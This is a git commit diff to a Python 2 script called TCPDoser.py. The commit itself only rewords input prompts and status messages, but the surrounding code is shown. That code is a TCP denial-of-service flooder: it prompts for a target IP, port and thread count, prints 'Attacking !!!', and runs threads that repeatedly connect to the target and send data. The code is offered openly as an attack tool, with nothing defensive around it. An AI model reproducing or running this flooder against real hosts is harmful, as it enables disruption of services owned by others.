3d52dfcda07bd83e267308447add3e39b1e07a41
bossy0 <36817786+bossy0@users.noreply.github.com>
2018-09-29 19:31:57 +0300

    Update and rename TCPDoser py to TCPDoser.py

--- TCPDoser.py
+++ TCPDoser.py
@@ -3,9 +3,9 @@ import socket
 import random
 import time
 
-ip = raw_input("Url/ip:")
-port = input("Port:")
-thread_num = input("Threads:")
+ip = raw_input("IP : ")
+port = input("Port : ")
+thread_num = input("Threads : ")
 print "Attacking !!! Thread:",thread_num
 
 def run():
@@ -15,10 +15,10 @@ def run():
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((str(ip),int(port))) 
 			s.send(bytes)
-			print "Request send!"
+			print "Package Sent !"
 		except:
 			s.close()
-			print "Error, socket close"
+			print "Error , Socket Closed"
 			
 for i in range(thread_num):
     th = threading.Thread(target = run)
